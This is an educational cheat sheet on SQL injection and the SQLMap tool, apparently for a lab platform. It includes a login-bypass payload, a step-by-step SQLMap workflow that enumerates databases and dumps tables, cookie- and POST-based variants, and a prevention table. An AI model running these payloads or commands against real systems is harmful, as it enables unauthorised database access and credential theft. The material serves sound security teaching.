# SQL Injection & SQLMap

## 💉 What Is SQL Injection?

SQL injection (SQLi) occurs when **user input is not properly sanitised**, allowing an attacker to manipulate SQL queries sent to the database. Since websites use SQL to interact with databases (retrieve, store, modify data), injecting malicious SQL can compromise the entire database.

> **Always obtain permission from the application owner before testing for SQL injection.**

---

## 🔍 How It Works — The Login Example

### Normal Request

User enters:
```
Username: John
Password: Un@detectable444
```

Website sends to database:
```sql
SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
```
✅ Returns John's record if credentials match.

---

### Injected Request

Attacker enters:
```
Username: John
Password: abc' OR 1=1;-- -
```

Website sends to database:
```sql
SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
```

**Why this works:**

| Part | Effect |
|------|--------|
| `abc` | Random string — wrong password, condition fails |
| `'` | Closes the password string in the SQL query |
| `OR 1=1` | Always true — overrides the failed password check |
| `;-- -` | Comments out everything after — prevents syntax errors |

> The `'` after `abc` is critical — without it, the entire string `abc OR 1=1;-- -` would be treated as the password. The single quote *closes* the password field and lets the attacker *inject* new SQL logic.

---

## ⚠️ SQL Injection Types

| Type | Description |
|------|-------------|
| **Boolean-based blind** | Modifies query with a boolean expression (e.g. `AND 1=1`) — infers data from true/false responses |
| **Error-based** | Intentionally malformed queries that return database errors containing useful info |
| **Time-based blind** | Uses `SLEEP()` — if the response is delayed, the injection is confirmed |
| **UNION query** | Appends a `UNION SELECT` to retrieve data from other tables |

---

## 🤖 SQLMap — Automated SQL Injection Tool

SQLMap automates detection and exploitation of SQL injection vulnerabilities.

```bash
sqlmap --help               # List all available flags
sqlmap --wizard             # Interactive guided mode — great for beginners
```

---

## 🔑 Core SQLMap Flags

| Flag | Description | Example |
|------|-------------|---------|
| `-u` | Target URL | `-u "http://target.thm/search?cat=1"` |
| `-r` | Use intercepted request file (POST testing) | `-r intercepted_request.txt` |
| `--dbs` | Extract all database names | `--dbs` |
| `-D` | Specify a database | `-D users` |
| `--tables` | Extract table names from specified DB | `-D users --tables` |
| `-T` | Specify a table | `-T thomas` |
| `--dump` | Dump records from specified table | `-D users -T thomas --dump` |
| `--cookie` | Include session cookie for authenticated testing | `--cookie="PHPSESSID=abc123"` |

---

## 🔁 Exploitation Workflow

### Step 1 — Identify a Vulnerable URL

Look for GET parameters in URLs:
```
http://sqlmaptesting.thm/search?cat=1
                                ↑ potential injection point
```

### Step 2 — Test the URL

```bash
sqlmap -u "http://sqlmaptesting.thm/search/cat=1"
```

**Example output — vulnerability confirmed:**
```
GET parameter 'cat' is vulnerable.
- boolean-based blind
- error-based
- time-based blind
- UNION query
Back-end DBMS: MySQL >= 5.1
```

### Step 3 — Extract Database Names

```bash
sqlmap -u "http://sqlmaptesting.thm/search/cat=1" --dbs
```

**Example output:**
```
available databases [2]:
[*] users
[*] members
```

### Step 4 — Extract Tables from a Database

```bash
sqlmap -u "http://sqlmaptesting.thm/search/cat=1" -D users --tables
```

**Example output:**
```
Database: users
[3 tables]
+-----------+
| johnath   |
| alexas    |
| thomas    |
+-----------+
```

### Step 5 — Dump Records from a Table

```bash
sqlmap -u "http://sqlmaptesting.thm/search/cat=1" -D users -T thomas --dump
```

**Example output:**
```
Database: users
Table: thomas
[1 entry]
+------------+------------+---------+
| Date       | name       | pass    |
+------------+------------+---------+
| 09/09/2024 | Thomas THM | testing |
+------------+------------+---------+
```

---

## 📬 POST-Based Testing (Login & Registration Forms)

When a web app sends data in the **request body** rather than the URL (e.g. login forms), intercept the POST request with Burp Suite and save it as a `.txt` file, then pass it to SQLMap:

```bash
sqlmap -r intercepted_request.txt
```

---

## 🍪 Authenticated Testing (Cookie-Based)

Many injection points are only reachable after logging in. Capture the session cookie from your browser and pass it to SQLMap:

```bash
sqlmap -u "http://target.thm/dashboard?id=1" --cookie="PHPSESSID=abcdef123456"
```

---

## 📋 Quick Reference

```bash
# Test a GET URL for SQLi
sqlmap -u "http://target.thm/search?cat=1"

# Extract database names
sqlmap -u "http://target.thm/search?cat=1" --dbs

# Extract tables from a database
sqlmap -u "http://target.thm/search?cat=1" -D dbname --tables

# Dump a table
sqlmap -u "http://target.thm/search?cat=1" -D dbname -T tablename --dump

# Test a POST request from file
sqlmap -r intercepted_request.txt

# Test with session cookie (authenticated)
sqlmap -u "http://target.thm/page?id=1" --cookie="PHPSESSID=abc123"

# Interactive wizard mode
sqlmap --wizard
```

---

## 🛡️ Prevention

| Measure | Description |
|---------|-------------|
| **Parameterised queries** | Use prepared statements — never concatenate user input directly into SQL |
| **Input validation** | Sanitise and validate all user input server-side |
| **Least privilege** | DB user accounts should only have the permissions they need |
| **WAF** | Web Application Firewall can detect and block common SQLi patterns |
| **Error handling** | Never expose raw database errors to the user |
